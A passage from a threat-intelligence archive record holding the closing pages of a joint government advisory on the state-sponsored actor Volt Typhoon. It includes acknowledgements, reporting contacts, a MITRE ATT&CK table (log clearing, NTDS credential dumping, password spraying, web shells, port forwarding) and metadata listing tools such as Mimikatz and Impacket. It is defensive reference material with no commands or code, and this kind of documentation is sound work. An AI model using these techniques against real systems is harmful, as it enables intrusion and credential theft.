https://learn.microsoft.com/en-us/windows/win32/wmisdk/tracing-wmiactivity\nWindows password spraying:\n\n20/24\n\nLogging and playbook configuration: https://learn.microsoft.com/enus/security/compass/incident-response-playbook-password-spray\n\nAcknowledgements\nThe NSA Cybersecurity Collaboration Center, along with the authoring agencies,\nacknowledge Amazon Web Services (AWS) Security, Broadcom, Cisco Talos, Google's\nThreat Analysis Group, Lumen Technologies, Mandiant, Microsoft Threat Intelligence (MSTI),\nPalo Alto Networks, SecureWorks, SentinelOne, Trellix, and additional industry partners for\ntheir collaboration on this advisory.\nDisclaimer of endorsement\n\nThe information and opinions contained in this document are provided \"as is\" and without\nany warranties or guarantees. Reference herein to any specific commercial products,\nprocess, or service by trade name, trademark, manufacturer, or otherwise does not\nconstitute or imply its endorsement, recommendation, or favoring by the authoring agencies'\ngovernments, and this guidance shall not be used for advertising or product endorsement\npurposes.\nTrademark recognition\n\nActive Directory®, Microsoft®, PowerShell®, and Windows® are registered trademarks of\nMicrosoft Corporation. MITRE® and ATT&CK® are registered trademarks of The MITRE\nCorporation.\nPurpose\n\nThis document was developed in furtherance of the authoring agencies’ cybersecurity\nmissions, including their responsibilities to identify and disseminate threats, and to develop\nand issue cybersecurity specifications and mitigations. This information may be shared\nbroadly to reach all appropriate stakeholders.\nContact\n\nU.S. organizations: Urgently report any anomalous activity or incidents, including based\nupon technical information associated with this Cybersecurity Advisory, to CISA at\nReport@cisa.dhs.govor cisa.gov/reportor to the FBI via your local FBI field office listed at\nhttps://www.fbi.gov/contact-us/field-offices.\nNSA Cybersecurity Report Questions and Feedback:CybersecurityReports@nsa.gov\nNSA Defense Industrial Base Inquiries and Cybersecurity\nServices:DIB_Defense@cyber.nsa.gov\nNSA Media Inquiries / Press Desk: 443-634-0721,MediaRelations@nsa.gov\n\n21/24\n\nAustralian organizations: Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report\ncybersecurity incidents and to access alerts and advisories.\nCanadian organizations: Report incidents by emailing CCCS atcontact@cyber.gc.ca.\nNew Zealand organizations: Report cyber security incidents to incidents@ncsc.govt.nz or\ncall 04 498 7654.\nUnited Kingdom organizations: Report a significant cyber security incident at\nncsc.gov.uk/report-an-incident (monitored 24 hours) or, for urgent assistance, call 03000 200\n973.\n\nAppendix: MITRE ATT&CK Techniques\nTable 2 captures all referenced threat actor tactics and techniques in this advisory.\nTable 2: All referenced threat actor tactics and techniques\nInitial Access\nTechnique Title\n\nID\n\nUse\n\nExploit Public-facing\nApplication\n\nT1190\n\nActor used public-facing applications to gain initial\naccess to systems; in this case, Earthworm and\nPortProxy.\n\nWindows\nManagement\nInstrumentation\n\nT1047\n\nThe actor executed WMIC commands to create a\ncopy of the SYSTEM registry.\n\nCommand and\nScripting Interpreter:\nPowerShell\n\nT1059.001\n\nThe actor used a PowerShell command to identify\nsuccessful logons to the host.\n\nCommand and\nScripting Interpreter:\nWindows Command\nShell\n\nT1059.003\n\nThe actor used this primary command prompt to\nexecute a query that collected information about the\nstorage devices on the local host.\n\nExecution\n\nPersistence\n\n22/24\n\nT1505.003\n\nThe actor used backdoor web servers with web\nshells to establish persistence to systems, including\nsome of the webshells being derived from Awen\nwebshell.\n\nIndicator Removal\n\nT1070\n\nThe actor selectively cleared Windows Event Logs,\nsystem logs, and other technical artifacts to remove\nevidence of their intrusion activity.\n\nIndicator Removal:\nClear Windows Event\nLogs\n\nT1070.001\n\nThe actor cleared system event logs to hide activity\nof an intrusion.\n\nOS Credential\nDumping: NTDS\n\nT1003.003\n\nThe actor may try to exfiltrate the ntds.dit file and\nthe SYSTEM registry hive out of the network to\nperform password cracking.\n\nBrute Force\n\nT1110\n\nThe actor attempted to gain access to accounts with\nmultiple password attempts.\n\nBrute Force:\nPassword Spraying\n\nT1110.003\n\nThe actor used commonly used passwords against\naccounts to attempt to acquire valid credentials.\n\nOS Credential\nDumping\n\nT1003\n\nThe actor used additional commands to obtain\ncredentials in the environment.\n\nCredentials from\nPassword Stores\n\nT1555\n\nThe actors searched for common password storage\nlocations.\n\nSystem Information\nDiscovery\n\nT1082\n\nThe actors executed commands to gather\ninformation about local drives.\n\nSystem Owner/User\nDiscovery\n\nT1033\n\nThe actors gathered information about successful\nlogons to the host using a PowerShell command.\n\nServer Software\nComponent: Web\nShell\n\nDefense Evasion\n\nCredential Access\n\nDiscovery\n\n23/24\n\nPermission Groups\nDiscovery: Local\nGroups\n\nT1069.001\n\nThe actors attempt to find local system groups and\npermission settings.\n\nPermission Groups\nDiscovery: Doman\nGroups\n\nT1069.002\n\nThe actors used commands to enumerate the active\ndirectory structure.\n\nSystem Network\nConfiguration\nDiscovery\n\nT1016\n\nThe actors used commands to enumerate the\nnetwork topology.\n\nProxy\n\nT1090\n\nThe actors used commands to enable port\nforwarding on the host.\n\nProxy: External Proxy\n\nT1090.002\n\nThe actors used compromised SOHO devices (e.g.\nrouters) to obfuscate the source of their activity.\n\nCommand and\nControl\n\n24/24",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-05-24 - AA23-144a- People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection.pdf"
    ],
    "report_names": [
        "2023-05-24 - AA23-144a- People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection.pdf"
    ],
    "threat_actors": [
        {
            "id": "846522d7-29cb-4a0c-8ebe-ffba7429e2d7",
            "created_at": "2023-06-23T02:04:34.793629Z",
            "updated_at": "2024-11-22T02:02:01.234118Z",
            "deleted_at": null,
            "main_name": "Volt Typhoon",
            "aliases": [
                "Bronze Silhouette",
                "VOLTZITE",
                "Vanguard Panda"
            ],
            "source_name": "ETDA:Volt Typhoon",
            "tools": [
                "FRP",
                "Fast Reverse Proxy",
                "Impacket",
                "LOLBAS",
                "LOLBins",
                "Living off the Land"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "382f2519-30b3-4943-b494-2d675bc2b38f",
            "created_at": "2024-06-19T02:03:07.951514Z",
            "updated_at": "2024-11-22T02:02:52.998745Z",
            "deleted_at": null,
            "main_name": "BRONZE SILHOUETTE",
            "aliases": [
                "Volt Typhoon "
            ],
            "source_name": "Secureworks:BRONZE SILHOUETTE",
            "tools": [
                " Web shells",
                "Living-off-the-land binaries"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "4ed2b20c-7523-4852-833b-cebee8029f55",
            "created_at": "2023-05-26T02:02:03.524749Z",
            "updated_at": "2024-11-22T02:00:02.817363Z",
            "deleted_at": null,
            "main_name": "Volt Typhoon",
            "aliases": [
                "VOLTZITE",
                "Dev-0391",
                "Storm-0391",
                "BRONZE SILHOUETTE",
                "VANGUARD PANDA",
                "UNC3236",
                "Insidious Taurus"
            ],
            "source_name": "MISPGALAXY:Volt Typhoon",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a88747e2-ffed-45d8-b847-8464361b2254",
            "created_at": "2023-11-01T02:01:06.605663Z",
            "updated_at": "2024-11-22T02:00:52.310366Z",
            "deleted_at": null,
            "main_name": "Volt Typhoon",
            "aliases": [
                "Volt Typhoon",
                "BRONZE SILHOUETTE",
                "Vanguard Panda",
                "DEV-0391",
                "UNC3236",
                "Voltzite",
                "Insidious Taurus"
            ],
            "source_name": "MITRE:Volt Typhoon",
            "tools": [
                "netsh",
                "PsExec",
                "ipconfig",
                "Wevtutil",
                "VersaMem",
                "Tasklist",
                "Mimikatz",
                "Impacket",
                "Systeminfo",
                "netstat",
                "Nltest",
                "certutil",
                "FRP",
                "cmd"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1685930876180,
    "ts_updated_at": 1732241008774,
    "ts_creation_date": 1685883777000,
    "ts_modification_date": 1685883777000,
    "files": {
        "pdf": "https://archive.orkl.eu/b299f3685100e68d79d30b8949428b0f954d3cc9.pdf",
        "text": "https://archive.orkl.eu/b299f3685100e68d79d30b8949428b0f954d3cc9.txt",
        "img": "https://archive.orkl.eu/b299f3685100e68d79d30b8949428b0f954d3cc9.jpg"
    }
}